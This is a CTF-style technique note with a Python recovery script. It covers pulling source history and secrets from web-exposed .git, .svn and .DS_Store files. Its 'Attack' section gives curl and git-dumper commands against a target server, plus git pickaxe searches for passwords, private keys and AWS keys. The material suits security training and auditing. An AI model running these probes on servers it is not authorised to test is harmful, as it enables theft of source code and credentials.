---
title: "Git, SVN and .DS_Store Data Recovery"
category: misc
subcategory: forensics-recovery
type: technique
tags: [git, git-dumper, dot-git, git-fsck, dangling-objects, reflog, packfile, svn, wc-db, ds-store, zlib, loose-objects, source-leak, recovery, exposed-vcs]
difficulty: medium
summary: "An exposed .git is the whole source history; recover it from loose objects, packfiles, the index and the reflog even without directory listing."
when_to_use:
  - "A web server serves /.git/, /.svn/ or /.DS_Store"
  - "You are handed a repository and told a secret was deleted"
  - "git log shows nothing but git fsck reports dangling objects"
  - "A Docker image or an archive contains a .git directory"
tools: [git, git-dumper, wget, curl, python3, zlib, binwalk, sqlite3]
related: [misc-classics, hunt-source-leak, ctf-general-cheatsheet, container-escape, linux-privesc]
---

## TL;DR

Git stores every version of every file as a zlib-compressed object named by its SHA-1. If you
can read `.git/objects/`, you have the entire history including files that were "deleted". When
directory listing is off, you reconstruct the object list from `.git/HEAD`, `.git/refs/*`,
`.git/packed-refs`, `.git/index` and `.git/logs/HEAD`, then walk the commit/tree graph.

## Recognise it

```bash
# the four probes that matter
curl -s https://target/.git/HEAD          # "ref: refs/heads/main" -> exposed
curl -s https://target/.git/config
curl -s https://target/.svn/wc.db -o wc.db && file wc.db
curl -s https://target/.DS_Store -o ds && file ds
# directory listing (rare but ideal)
curl -s https://target/.git/ | head
```

A 200 with `ref: refs/heads/...` is the giveaway. A 403 on `/.git/` but a 200 on
`/.git/HEAD` still means you win - you just have to walk the graph instead of mirroring.

## Theory

### Git object storage

```text
.git/
  HEAD                 "ref: refs/heads/main"
  config               remote URLs, sometimes credentials
  index                the staging area: paths + blob SHAs + stat data (binary, DIRC magic)
  packed-refs          branch/tag -> commit SHA, one per line
  refs/heads/<branch>  a single 40-char SHA
  logs/HEAD            the reflog: every position HEAD ever had (old-sha new-sha ...)
  logs/refs/heads/*    per-branch reflog
  objects/
    ab/cdef0123...     loose object: zlib(<type> <len>\0<content>)
    pack/pack-*.pack   many objects, delta-compressed
    pack/pack-*.idx    the index for that pack: which SHAs are in it and at what offset
    info/packs         lists the pack files (useful when there is no directory listing)
  ORIG_HEAD, FETCH_HEAD, MERGE_HEAD   more commit SHAs
```

A loose object decompresses to `"<type> <size>\0"` followed by the content, where type is
`blob`, `tree`, `commit` or `tag`. The SHA-1 is computed over that full uncompressed form,
which is how you verify an object you recovered.

- **commit** -> text: `tree <sha>`, `parent <sha>`, author, committer, message.
- **tree** -> binary: repeated `<mode> <name>\0<20-byte sha>`.
- **blob** -> the file content.

### The recovery chain without directory listing

1. `GET /.git/HEAD` -> the current branch name.
2. `GET /.git/refs/heads/<branch>` (and `/.git/packed-refs`) -> a commit SHA.
3. `GET /.git/objects/<2>/<38>` -> the commit object.
4. Parse its `tree` and `parent` SHAs, fetch those, recurse.
5. `GET /.git/logs/HEAD` -> every SHA HEAD ever pointed at, including rewritten history.
6. `GET /.git/index` -> blob SHAs for every staged file, including ones never committed.
7. `GET /.git/objects/info/packs` and `/.git/objects/pack/pack-<sha>.idx` -> the pack contents.

## Attack

### Mirror it

```bash
# the purpose-built tool (handles the no-listing case by walking the graph)
git-dumper https://target/.git/ ./out

# the blunt instrument, when directory listing IS enabled
wget -r -np -R "index.html*" https://target/.git/
# then
cd target && git checkout -- . && git status

# manual, when you only have curl
curl -s https://target/.git/HEAD
curl -s https://target/.git/refs/heads/main
curl -s https://target/.git/objects/de/adbeef... | python3 -c \
  "import sys,zlib;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))"
```

### Mine a repository you already have

```bash
# everything, including commits not reachable from any branch
git log --all --oneline --graph --decorate
git log --all --full-history -- path/to/secret
git log -p --all -S 'password'          # pickaxe: commits that added/removed that string
git log -p --all -G 'BEGIN PRIVATE KEY' # same, but regex
git rev-list --objects --all | head -50

# the reflog: local history of where HEAD has been, survives rebases and resets
git reflog --date=iso
git reflog show --all

# dangling / unreachable objects - where "deleted" commits live
git fsck --full --unreachable --dangling --no-reflogs
git cat-file -p <sha>
git cat-file -t <sha>
git show <sha>

# stashes
git stash list && git stash show -p stash@{0}

# packfiles
ls .git/objects/pack/
git verify-pack -v .git/objects/pack/pack-*.idx | sort -k3 -n | tail -20
git unpack-objects < .git/objects/pack/pack-*.pack    # into a fresh repo

# what is in the index but not committed
git ls-files -s
git diff --cached

# configured remotes, sometimes with credentials in the URL
cat .git/config; git remote -v
cat .git/logs/HEAD
```

### SVN

```bash
curl -s https://target/.svn/wc.db -o wc.db
sqlite3 wc.db "SELECT local_relpath, checksum FROM NODES;"
# checksums map to .svn/pristine/<first2>/<sha1>.svn-base
curl -s https://target/.svn/pristine/de/deadbeef....svn-base -o file
# older layouts (<=1.6) use .svn/entries and .svn/text-base/<file>.svn-base
curl -s https://target/.svn/entries
```

### .DS_Store

macOS Finder metadata. It contains **file and directory names**, which is a directory listing
even when the server disables one.

```bash
curl -s https://target/.DS_Store -o ds
python3 ds_store_parse.py ds       # see the code below
```

## Code

```python
#!/usr/bin/env python3
"""Recover data from .git loose objects and from .DS_Store files.

  python3 vcs_recover.py git   /path/to/.git
  python3 vcs_recover.py dsstore .DS_Store
  python3 vcs_recover.py --selftest
"""
from __future__ import annotations

import hashlib
import os
import struct
import sys
import zlib

# --------------------------------------------------------------------------- #
# git loose objects
# --------------------------------------------------------------------------- #
def decode_object(raw: bytes) -> tuple[str, bytes]:
    """Decompress a loose object and split off its '<type> <len>\\0' header."""
    data = zlib.decompress(raw)
    header, _, body = data.partition(b"\x00")
    typ, _, size = header.decode("latin1").partition(" ")
    if int(size) != len(body):
        raise ValueError(f"size mismatch: header says {size}, body is {len(body)}")
    return typ, body


def object_sha(typ: str, body: bytes) -> str:
    """The SHA-1 git would give this object - use it to verify a recovery."""
    store = f"{typ} {len(body)}".encode() + b"\x00" + body
    return hashlib.sha1(store).hexdigest()


def encode_object(typ: str, body: bytes) -> bytes:
    store = f"{typ} {len(body)}".encode() + b"\x00" + body
    return zlib.compress(store)


def parse_tree(body: bytes) -> list[tuple[str, str, str]]:
    """Return [(mode, name, sha_hex)] from a tree object."""
    out = []
    i = 0
    while i < len(body):
        j = body.index(b" ", i)
        mode = body[i:j].decode()
        k = body.index(b"\x00", j)
        name = body[j + 1:k].decode("utf-8", "replace")
        sha = body[k + 1:k + 21].hex()
        out.append((mode, name, sha))
        i = k + 21
    return out


def parse_commit(body: bytes) -> dict:
    """Return the header fields and the message of a commit object."""
    head, _, message = body.partition(b"\n\n")
    info: dict = {"parents": [], "message": message.decode("utf-8", "replace").strip()}
    for line in head.decode("utf-8", "replace").splitlines():
        key, _, val = line.partition(" ")
        if key == "parent":
            info["parents"].append(val)
        elif key:
            info[key] = val
    return info


def walk_loose(gitdir: str) -> list[tuple[str, str, bytes]]:
    """Every loose object in .git/objects as (sha, type, body)."""
    objdir = os.path.join(gitdir, "objects")
    out = []
    for prefix in sorted(os.listdir(objdir)):
        if len(prefix) != 2:
            continue
        d = os.path.join(objdir, prefix)
        if not os.path.isdir(d):
            continue
        for rest in sorted(os.listdir(d)):
            sha = prefix + rest
            with open(os.path.join(d, rest), "rb") as fh:
                raw = fh.read()
            try:
                typ, body = decode_object(raw)
            except (zlib.error, ValueError) as exc:
                print(f"[!] {sha}: {exc}", file=sys.stderr)
                continue
            if object_sha(typ, body) != sha:
                print(f"[!] {sha}: hash mismatch (corrupt or truncated)", file=sys.stderr)
            out.append((sha, typ, body))
    return out


def parse_index(path: str) -> list[tuple[str, str]]:
    """Read .git/index (version 2/3/4 header) and return [(path, blob_sha)]."""
    with open(path, "rb") as fh:
        data = fh.read()
    if data[:4] != b"DIRC":
        raise ValueError("not a git index (missing DIRC magic)")
    version, count = struct.unpack(">II", data[4:12])
    entries: list[tuple[str, str]] = []
    i = 12
    for _ in range(count):
        if i + 62 > len(data):
            break
        sha = data[i + 40:i + 60].hex()
        flags = struct.unpack(">H", data[i + 60:i + 62])[0]
        namelen = flags & 0x0FFF
        j = i + 62
        if namelen < 0x0FFF:
            name = data[j:j + namelen].decode("utf-8", "replace")
            j += namelen
        else:
            end = data.index(b"\x00", j)
            name = data[j:end].decode("utf-8", "replace")
            j = end
        entries.append((name, sha))
        # entries are padded with NULs to a multiple of 8 bytes (index v2/v3)
        if version < 4:
            j = ((j - i + 8) // 8) * 8 + i
            while j < len(data) and data[j - 1] != 0:
                j += 1
        i = j
    return entries


def candidate_urls(base: str, shas: list[str]) -> list[str]:
    """The URLs to fetch for a set of object SHAs (no directory listing needed)."""
    fixed = ["HEAD", "config", "index", "packed-refs", "ORIG_HEAD", "FETCH_HEAD",
             "logs/HEAD", "refs/heads/main", "refs/heads/master", "refs/heads/develop",
             "objects/info/packs", "description", "COMMIT_EDITMSG"]
    urls = [f"{base.rstrip('/')}/{p}" for p in fixed]
    urls += [f"{base.rstrip('/')}/objects/{s[:2]}/{s[2:]}" for s in shas]
    return urls


def shas_from_text(text: str) -> list[str]:
    """Every 40-hex SHA in a blob of text (refs, reflog, packed-refs, commit bodies)."""
    import re
    return sorted(set(re.findall(r"\b[0-9a-f]{40}\b", text)))


# --------------------------------------------------------------------------- #
# .DS_Store
# --------------------------------------------------------------------------- #
def parse_ds_store(data: bytes) -> list[str]:
    """Extract filenames from a .DS_Store file.

    The format is a Buddy allocator holding a B-tree of records; rather than
    implementing the allocator, scan for the record structure directly:
    each record is <u32 name length><UTF-16BE name><4-byte structure id><4-byte type>.
    """
    names: list[str] = []
    i = 0
    n = len(data)
    while i + 8 < n:
        (length,) = struct.unpack(">I", data[i:i + 4])
        if 1 <= length <= 255 and i + 4 + length * 2 + 8 <= n:
            raw = data[i + 4:i + 4 + length * 2]
            try:
                name = raw.decode("utf-16-be")
            except UnicodeDecodeError:
                i += 1
                continue
            struct_id = data[i + 4 + length * 2:i + 8 + length * 2]
            if name.isprintable() and struct_id.isalpha() and len(name.strip()) > 0:
                names.append(name)
                i += 4 + length * 2
                continue
        i += 1
    seen: set[str] = set()
    out = []
    for nm in names:
        if nm not in seen:
            seen.add(nm)
            out.append(nm)
    return out


def build_ds_store(names: list[str]) -> bytes:
    """Build a minimal .DS_Store-shaped blob (used by the self-test)."""
    out = bytearray(b"\x00\x00\x00\x01Bud1" + b"\x00" * 24)
    for nm in names:
        enc = nm.encode("utf-16-be")
        out += struct.pack(">I", len(nm)) + enc + b"Iloc" + b"blob"
        out += b"\x00" * 4
    return bytes(out)


# --------------------------------------------------------------------------- #
def cmd_git(gitdir: str) -> None:
    objs = walk_loose(gitdir)
    print(f"[i] {len(objs)} loose objects")
    for sha, typ, body in objs:
        if typ == "commit":
            info = parse_commit(body)
            print(f"commit {sha[:12]} tree={info.get('tree', '')[:12]} "
                  f"parents={[p[:8] for p in info['parents']]} msg={info['message'][:60]!r}")
        elif typ == "tree":
            print(f"tree   {sha[:12]}")
            for mode, name, child in parse_tree(body):
                print(f"         {mode} {child[:12]} {name}")
        elif typ == "blob":
            preview = body[:80]
            print(f"blob   {sha[:12]} {len(body)} bytes {preview!r}")
    idx = os.path.join(gitdir, "index")
    if os.path.exists(idx):
        print("[i] index entries:")
        for name, sha in parse_index(idx):
            print(f"  {sha[:12]} {name}")


def _selftest() -> None:
    import subprocess
    import tempfile

    # --- object encode/decode/verify round trip ---------------------------
    body = b"flag{recovered_from_a_blob}\n"
    raw = encode_object("blob", body)
    typ, got = decode_object(raw)
    assert typ == "blob" and got == body
    sha = object_sha("blob", body)
    assert len(sha) == 40 and all(c in "0123456789abcdef" for c in sha)

    # a tree object round trip
    tree_body = b"100644 secret.txt\x00" + bytes.fromhex(sha)
    entries = parse_tree(tree_body)
    assert entries == [("100644", "secret.txt", sha)], entries

    # a commit object
    commit_body = (f"tree {sha}\n"
                   f"parent {'b' * 40}\n"
                   "author A <a@example.com> 1700000000 +0000\n"
                   "committer A <a@example.com> 1700000000 +0000\n"
                   "\nremove the secret\n").encode()
    info = parse_commit(commit_body)
    assert info["tree"] == sha and info["parents"] == ["b" * 40]
    assert info["message"] == "remove the secret"

    # SHA extraction from reflog-style text
    reflog = f"0000000000000000000000000000000000000000 {sha} A <a@e> 1700000000 +0000\tcommit\n"
    assert shas_from_text(reflog) == sorted({"0" * 40, sha})

    # url candidates
    urls = candidate_urls("https://t/.git", [sha])
    assert f"https://t/.git/objects/{sha[:2]}/{sha[2:]}" in urls
    assert "https://t/.git/logs/HEAD" in urls

    # --- .DS_Store ---------------------------------------------------------
    names = ["admin", "backup.zip", "flag.txt", "index.php"]
    blob = build_ds_store(names)
    found = parse_ds_store(blob)
    for nm in names:
        assert nm in found, (nm, found)

    # --- end to end against a real repository, if git is installed ---------
    tmp = tempfile.mkdtemp(prefix="gitrec_")
    env = dict(os.environ, GIT_AUTHOR_NAME="a", GIT_AUTHOR_EMAIL="a@e",
               GIT_COMMITTER_NAME="a", GIT_COMMITTER_EMAIL="a@e")
    try:
        subprocess.run(["git", "init", "-q", tmp], check=True, env=env,
                       capture_output=True, timeout=60)
        secret = os.path.join(tmp, "secret.txt")
        with open(secret, "w") as fh:
            fh.write("flag{deleted_but_not_gone}\n")
        subprocess.run(["git", "-C", tmp, "add", "."], check=True, env=env,
                       capture_output=True, timeout=60)
        subprocess.run(["git", "-C", tmp, "commit", "-q", "-m", "add secret"],
                       check=True, env=env, capture_output=True, timeout=60)
        os.remove(secret)
        subprocess.run(["git", "-C", tmp, "commit", "-aqm", "remove secret"],
                       check=True, env=env, capture_output=True, timeout=60)
    except (FileNotFoundError, subprocess.CalledProcessError, subprocess.TimeoutExpired) as exc:
        print(f"selftest ok (git not usable here: {exc}); object/tree/commit/DS_Store parsing verified")
        return

    objs = walk_loose(os.path.join(tmp, ".git"))
    blobs = [b for _s, t, b in objs if t == "blob"]
    assert any(b"flag{deleted_but_not_gone}" in b for b in blobs), \
        "the deleted file should still be a loose object"
    commits = [parse_commit(b) for _s, t, b in objs if t == "commit"]
    assert len(commits) == 2, commits
    idx_entries = parse_index(os.path.join(tmp, ".git", "index"))
    assert idx_entries == [] or all(len(s) == 40 for _n, s in idx_entries), idx_entries

    print(f"selftest ok: {len(objs)} objects walked, deleted blob recovered, "
          f"{len(commits)} commits parsed, DS_Store names {found[:4]}")


def main() -> int:
    if len(sys.argv) < 2 or sys.argv[1] == "--selftest":
        _selftest()
        return 0
    if sys.argv[1] == "git":
        cmd_git(sys.argv[2])
    elif sys.argv[1] == "dsstore":
        with open(sys.argv[2], "rb") as fh:
            for name in parse_ds_store(fh.read()):
                print(name)
    else:
        print(__doc__)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

## Variants and pitfalls

- **`git-dumper` handles the hard case** (no directory listing) by parsing refs and walking the
  object graph. Use it first; fall back to manual only when it fails.
- **Packfiles are the common gap.** If most objects are packed, you need
  `objects/info/packs` plus the `.idx`/`.pack` pair; a loose-object-only dump will look almost
  empty. `git verify-pack -v` then `git unpack-objects` gets you the rest.
- **`.git/index` lists files that were never committed.** Always fetch it.
- **`.git/config` sometimes carries credentials** in a remote URL
  (`https://user:token@github.com/...`).
- **`git fsck --lost-found`** writes unreachable objects into `.git/lost-found/` where you can
  `cat-file` them.
- **Rewritten history**: `git filter-branch`/BFG leave the old objects behind until `gc` runs.
  `git reflog` plus `git fsck --unreachable` finds them.
- **The `-S` pickaxe searches content changes**, not the message: `git log -p --all -S 'AKIA'`
  is the fastest way to find a leaked AWS key.
- **`.DS_Store` gives you names, not content.** Use the names to guess URLs; it commonly leaks
  `backup.zip`, `admin/`, `old/`, `.env`.
- **SVN `wc.db` is a SQLite file.** `sqlite3 wc.db .tables` then read `NODES`; the pristine
  files are stored by their SHA-1 under `.svn/pristine/<first-2-hex>/`.
- **Watch out for a honeypot `.git`.** In a CTF that is unlikely; on a real engagement, dumping
  a very large `.git` over HTTP is slow and noisy.
- **Git objects are zlib, not gzip.** `zlib.decompress`, not `gzip.decompress`.

## Tools

`git` (especially `cat-file`, `fsck`, `reflog`, `verify-pack`, `log -S`), `git-dumper`,
`wget -r`, `sqlite3` for SVN, `binwalk` for a `.git` embedded in an image, Python `zlib`.

## References

- Pro Git, "Git Internals - Git Objects" and "Packfiles" chapters:
  https://git-scm.com/book/en/v2/Git-Internals-Git-Objects
- Git documentation for the index file format
  (`Documentation/gitformat-index.txt` in the git source tree).
- Subversion working-copy `wc.db` schema documentation in the Subversion source.
